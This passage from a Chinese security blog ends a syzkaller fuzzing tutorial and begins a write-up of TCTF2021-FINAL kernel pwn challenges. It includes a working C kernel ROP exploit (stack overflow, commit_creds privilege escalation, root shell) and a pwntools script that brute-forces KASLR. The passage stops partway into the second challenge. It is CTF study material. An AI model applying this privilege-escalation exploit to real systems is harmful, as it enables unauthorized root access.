<code>syz-sysgen</code>，从而应用我们新编写的描述文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make bin/syz-extract</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make bin/syz-sysgen<span class="hljs-comment"># no need for syzkaller in new version</span></span><br></code></pre></td></tr></table></figure><ul><li>syz-extract 用以提取引入的内核头文件中的 define 常量等，生成 <code>.const</code> 文件</li><li>syz-sysgen 用以结合 <code>.txt</code> 文件与 <code>.const</code> 文件进行语法分析和语义分析生成 AST ，最后生成 <code>.go</code> 文件</li></ul><p>对于版本较新的 syzkaller ，其在编译时会默认编译 syz-sysgen，因此我们只需要手动编译 syz-extract 即可</p><h3 id="Step-III-处理新规则文件"><a href="#Step-III-处理新规则文件" class="headerlink" title="Step III.处理新规则文件"></a>Step III.处理新规则文件</h3><p>使用如下命令处理我们刚刚写的规则文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">bin/syz-extract -os linux -<span class="hljs-built_in">arch</span> <span class="hljs-variable">$ARCH</span> -sourcedir <span class="hljs-variable">$KSRC</span> -builddir <span class="hljs-variable">$LINUXBLD</span> &lt;new&gt;.txt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">bin/syz-sysgen<span class="hljs-comment"># no need for syzkaller in new version</span></span><br></code></pre></td></tr></table></figure><ul><li><code>$ARCH</code> 应为你的目标架构，可选项有 <code>amd64</code>, <code>386</code> <code>arm64</code>, <code>arm</code>, <code>ppc64le</code>, <code>mips64le</code></li><li><code>$KSRC</code> 应为 fuzz 的内核的源码目录</li><li><code>$LINUXBLD</code> 应为你的编译目录，为可选项（-builddir）</li><li><code>&lt;new&gt;.txt</code> 就是你刚刚编写的规则文件的文件名</li></ul><p>会在 <code>syzkaller/sys/linux</code> 下生成 <code>.const</code> 文件提取出常量，在正式编译时会进行替换，例如笔者上面给出的例程生成的 <code>.const</code> 文件如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs const"># Code generated by syz-sysgen. DO NOT EDIT.<br>arches = amd64<br>FASYNC = amd64:8192<br>O_APPEND = amd64:1024<br>O_CLOEXEC = amd64:524288<br>O_CREAT = amd64:64<br>O_DIRECT = amd64:16384<br>O_DIRECTORY = amd64:65536<br>O_EXCL = amd64:128<br>O_LARGEFILE = amd64:32768<br>O_NOATIME = amd64:262144<br>O_NOCTTY = amd64:256<br>O_NOFOLLOW = amd64:131072<br>O_NONBLOCK = amd64:2048<br>O_PATH = amd64:2097152<br>O_RDWR = amd64:2<br>O_SYNC = amd64:1052672<br>O_TRUNC = amd64:512<br>O_WRONLY = amd64:1<br>__NR_open = amd64:2<br>__NR_read = amd64:0<br>__NR_write = amd64:1<br>__O_TMPFILE = amd64:4194304<br><br></code></pre></td></tr></table></figure><h3 id="Step-IV-重新编译-syzkaller"><a href="#Step-IV-重新编译-syzkaller" class="headerlink" title="Step IV.重新编译 syzkaller"></a>Step IV.重新编译 syzkaller</h3><p>命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make generate</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h3 id="Step-V-修改配置文件，启动-syzkaller"><a href="#Step-V-修改配置文件，启动-syzkaller" class="headerlink" title="Step V.修改配置文件，启动 syzkaller"></a>Step V.修改配置文件，启动 syzkaller</h3><p>前面我们命名了 <code>a3proc</code> ，因此我们还需要在配置文件中进行 enable，在你的 <code>.cfg</code> 文件中添加这一项：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;enable_syscalls&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-string">&quot;open$a3proc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-string">&quot;read$a3proc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-string">&quot;write$a3proc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-string">&quot;close$a3proc&quot;</span><br><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>之后按惯例启动即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./bin/syz-manager -config=config.cfg</span><br></code></pre></td></tr></table></figure><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="*工作原理"></a><em>*工作原理</em></h2><p>当我们使用 syzlang 编写好模板之后，这些系统调用模板会通过 <strong>syz-extract</strong> 和 <strong>syz-sysgen</strong> 翻译为 syzkaller 能够读懂的代码，笔者这里简述一下其原理</p><blockquote><p>这里你可能需要一点编译原理的知识，不过笔者相信大家编译原理应当都及格了（笑）</p><blockquote><p><del>什么？你说你还没上这门课</del></p><blockquote><p><del>什么？用 syzkaller 挖洞只要会写 syzlang 就行了，根本不需要理解他的原理</del></p></blockquote></blockquote><p>简要而言，从源代码到可执行文件大概有如下过程：</p><ul><li>词法分析（lexical analysis）：扫描器（scanner，通常是一个有限状态自动机）从源码文本中逐字符读入，过滤掉注释，将词素映射为词法单元，生成符号表，建立映射，最终输出词素序列</li><li>语法分析（syntax analysis）：语法分析器从词法分析器中获取词素序列，构建树形的中间表示：通常是抽象语法树（abstract syntax tree），树形中间节点表示运算分量，最终输出被称之为词法单元流的语法树</li><li>语义分析（semantic analysis）：语义分析器使用语法树与符号表检查源程序的语义一致性，例如一个整数和一个字符串相加是符合语法规则的，但对于大部分语言而言这并不是一个合法的运算，因此不符合语义规则（<del>什么？你说你用 JavaScript</del>）</li><li><em>中间代码生成与优化：中间代码生成器通过语义分析的结果生成对应的中间代码（例如三地址码），并进行一定的优化</em></li><li><em>代码生成：由代码生成器将中间代码转为可执行代码</em></li></ul></blockquote><h3 id="syz-extract"><a href="#syz-extract" class="headerlink" title="syz-extract"></a>syz-extract</h3><p>第一步是从内核源文件中提取符号常量的值：<code>syz-extract</code> 会根据 syzlang 文件从内核源文件中提取出使用的对应的宏、系统调用号等的值，生成 <code>.const</code> 文件</p><h3 id="syz-sysgen"><a href="#syz-sysgen" class="headerlink" title="syz-sysgen"></a>syz-sysgen</h3><p>第二步便是将描述翻译成 Golang 代码：<code>syz-sysgen</code> 通过 syzlang 文件与 .const 文件进行语法分析与语义分析，生成抽象语法树，最终生成供 syzkaller 使用的 golang 代码，分为如下四个步骤：</p><ul><li><strong>assignSyscallNumbers</strong>：分配系统调用号，检测不支持的系统调用并丢弃</li><li><strong>patchConsts</strong>：将 AST 中的常量替换为对应的值</li><li><strong>check</strong>：进行语义分析</li><li><strong>genSyscalls</strong>：从 AST 生成 prog 对象</li></ul><h1 id="0x04-实战：用-syzkaller-挖掘出-CVE-20"><a href="#0x04-实战：用-syzkaller-挖掘出-CVE-20" class="headerlink" title="0x04.实战：用 syzkaller 挖掘出 CVE-20??-????"></a><del>0x04.实战：用 syzkaller 挖掘出 CVE-20??-????</del></h1><p><del>CVE-20??-???? 是由于 ?? 原因造成的内核空间中的 ??，笔者接下来将尝试使用 syzkaller 来挖掘出该漏洞</del></p><blockquote><p>🕊🕊🕊</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;尝试遍历所有的世界线&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/categories/FUZZ/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="漏洞挖掘" scheme="http://blog.arttnba3.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="syzkaller" scheme="http://blog.arttnba3.cn/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解</title>
    <link href="http://blog.arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/"/>
    <id>http://blog.arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/</id>
    <published>2021-10-30T20:57:30.000Z</published>
    <updated>2022-03-18T00:17:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>欧皇与非酋的对决</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p><a href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">官方题解见此处</a></p><p>前些日子（<del>好像是上个月的事情了</del>）打了 TCTF 2021 FINAL，其中刚好有两道 Linux kernel pwn 题，笔者在比赛期间没有多少头绪，最近趁有时间复现了一下</p><h1 id="0x01-kbrops"><a href="#0x01-kbrops" class="headerlink" title="0x01.kbrops"></a>0x01.kbrops</h1><blockquote><p>这个题目比赛时没做出来，<del>笔者原以为会有一种很高端很 nb 的解法，但是后面发现大家的解法都是嗯爆破…</del>赛后看了其他选手的题解发现比想象中简单太多了…签到题难度都算不上…<strong>但是很屑</strong></p><blockquote><p><del>大一的小朋友都能做出来的屑题，笔者不知道为什么会出现在 TCTF FINAL 中</del></p><blockquote><p><del>什么，你问为什么新星赛里这道题是 0 解？</del></p><blockquote><p><del>可能是因为大家都太非了吧</del></p></blockquote></blockquote></blockquote></blockquote><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>查看  <code>/sys/devices/system/cpu/vulnerabilities/ </code></p><p><img src="https://i.loli.net/2021/10/28/6cgnhXyrz2uLIaF.png" alt="image.png"></p><p>开启了 KPTI（内核页表隔离，一般简称页表隔离（PTI），笔者更喜欢用全称）</p><p>查看启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> intr ^]</span><br><span class="line"><span class="built_in">cd</span> `<span class="built_in">dirname</span> <span class="variable">$0</span>`</span><br><span class="line"><span class="built_in">timeout</span> --foreground 300 qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -cpu host,+smep,+smap \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor none \</span><br><span class="line">    -drive file=flag.txt,format=raw \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti quiet oops=panic panic=1&quot;</span></span><br></pre></td></tr></table></figure><p>开了 smap、smep、kaslr 保护</p><p>在这里并没有像常规的 kernel pwn 那样把 flag 权限设为 root 600 放在文件系统里，而是将 flag 作为一个设备载入，因此我们需要读取 <code>/dev/sda</code> 以获取 flag，仍然需要 root 权限</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p><img src="https://i.loli.net/2021/10/27/HcCDmWho3EVfenu.png" alt="image.png"></p><p>整个程序只定义了一个 ioctl 的 0x666 功能，会取我们传入的前两个字节作为后续拷贝的 size，之后 kmalloc 一个 object，从我们传入的第三个字节开始拷贝，之后再从 object 拷贝到栈上，因为两个字节最大就是 0xffff，所以这里直接就有一个裸的栈溢出</p><h2 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><p>既然目前有了栈溢出，而且没有 stack canary 保护，比较朴素的提权方法就是执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 提权到 root，但是由于开启了 kaslr，因此我们还需要知道 kernel offset，但是毫无疑问的是只有一个裸的溢出是没法让我们直接泄漏出内核中的数据的</p><p>这里 r3kapig 给出的解法是<strong>假装他没有这个 kaslr，然后直接硬打</strong>，据称大概试个几百次就能成功</p><blockquote><p>这里放笔者某位朋友的一句名言（</p><p><img src="https://i.loli.net/2021/10/28/AenCihQc1rldLFw.png" alt="image.png"></p></blockquote><p>赛后在 discord 群组中讨论，得知 kaslr 的随机化只有 9位，可以直接进行爆破</p><p><img src="https://i.loli.net/2021/10/31/RhZDQfjqnNr3ozt.png" alt="image.png"></p><p>笔者写了个爆破偏移用的 exp ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81090c20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810909b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81001619</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RET 0xffffffff81b66d10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ_RET 0xffffffff8102984b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0Xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>    *buf;</span><br><span class="line">    <span class="type">size_t</span>  *<span class="built_in">stack</span>;</span><br><span class="line">    <span class="type">int</span>     i;</span><br><span class="line">    <span class="type">int</span>     chal_fd;</span><br><span class="line">    <span class="type">size_t</span>  offset;</span><br><span class="line"></span><br><span class="line">    offset = (argv[<span class="number">1</span>]) ? atoi(argv[<span class="number">1</span>]) : <span class="number">0</span>;</span><br><span class="line">    saveStatus();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x2000</span>);</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> = (<span class="type">size_t</span>*)(buf + <span class="number">0x102</span>);</span><br><span class="line">    <span class="built_in">stack</span>[i++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;                 <span class="comment">// padding</span></span><br><span class="line">    <span class="built_in">stack</span>[i++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;                 <span class="comment">// rbp</span></span><br><span class="line">    <span class="built_in">stack</span>[i++] = POP_RDI_RET + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = PREPARE_KERNEL_CRED + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = COMMIT_CREDS + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + offset;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = (<span class="type">size_t</span>) getRootShell;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_cs;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_rflags;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_sp;</span><br><span class="line">    <span class="built_in">stack</span>[i++] = user_ss;</span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">short</span> *)(buf))[<span class="number">0</span>] = <span class="number">0x112</span> + i * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    chal_fd = open(<span class="string">&quot;/proc/chal&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(chal_fd, <span class="number">0x666</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里 ROP 链布局中 <code>prepare_kernel_cred</code> 后直接就到 <code>commit_creds</code> 是因为经过笔者调试发现在执行完 <code>prepare_kernel_cred</code> 后此时的 rax 与 rdi 都指向 root cred，因此不需要再 <code>mov rdi, rax</code></p><p><img src="https://i.loli.net/2021/10/28/Tud1Lb8SkrXycxt.png"></p></blockquote><p>打远程用的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)<span class="comment">#remote(&quot;127.0.0.1&quot;, 1234)</span></span><br><span class="line">try_count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;no.&quot;</span> + <span class="built_in">str</span>(try_count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p.sendline()</span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>].decode() + <span class="string">&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;~ $&quot;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&quot;cat b64_exp | base64 -d &gt; ./exploit&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod +x ./exploit&quot;</span>)</span><br><span class="line">    randomization = (try_count % <span class="number">1024</span>) * <span class="number">0x100000</span></span><br><span class="line">    log.info(<span class="string">&#x27;trying randomization: &#x27;</span> + <span class="built_in">hex</span>(randomization))</span><br><span class="line">    p.sendline(<span class="string">&quot;./exploit &quot;</span> + <span class="built_in">str</span>(randomization))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.recvuntil(<span class="string">b&quot;Rebooting in 1 seconds..&quot;</span>, timeout=<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    log.warn(<span class="string">&#x27;failed!&#x27;</span>)</span><br><span class="line">    try_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;success to get the root shell!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/28/pBTRsQiA9HdaX16.png" alt="image.png"></p><p>反正笔者在本地没打通过，<del>属于是屑题</del></p><blockquote><p>笔者原本以为<strong>会有一种特别高端特别 NB 的方法来绕过 KASLR，实现 Kernel BROP</strong>，后面发现<strong>纯粹就拼脸</strong>，脸好就能拿到flag</p></blockquote><blockquote><p>r3kapig 的 wp 上还展示了一个“小技巧”：众所周知在开启 KPTI 的情况下直接返回用户态会 segmentation fault，这个时候我们可以<strong>把原来的返回地址 getRootShell 函数设为 SIGSEGV 信号的处理函数</strong>，这样原先的 <code>swapgs ; iretq</code> 的方法就可以继续用了</p><p><del>那为什么不直接用  swapgs_restore_regs_and_return_to_usermode 呢</del></p></blockquote><h1 id="0x02-kernote"><a href="#0x02-kernote" class="headerlink" title="0x02.kernote"></a>0x02.kernote</h1><h2 id="一、题目分析-1"><a href="#一、题目分析-1" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>这一题的题解笔者主要还是参照着官方的题解来写的，是本场比赛中给笔者带来收获最大的一道 kernel pwn 题</p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>与一般的 kernel pwn 题不同的是，这一次给出的文件系统不是简陋的 ramfs 而是常规的 ext4 镜像文件，我们可以使用 <code>mount</code> 命令将其挂载以查看并修改其内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount rootfs.img /mnt/temp</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/26/iRaDAoUKVOeQ1r7.png" alt="image.png"></p><p>本地调试时直接将文件复制到挂载点下即可，在 <code>umount</code> 之后修改会自动生效</p><h3 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h3><p>我们首先查看题目提供的 <code>README.md</code>：</p><blockquote><p>Here are some kernel config options in case you need it</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></figure></blockquote><p>我们可以看到的是出题人在编译内核时并没有选择默认的 slub 分配器，而是选择了 <code>slab</code> 分配器，后续我们解题的过程也与 slab 的特征有关</p><ul><li>开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）</li><li>开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））</li><li>开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）</li><li>开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）</li></ul><p>接下来分析启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-hda ./rootfs.img \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 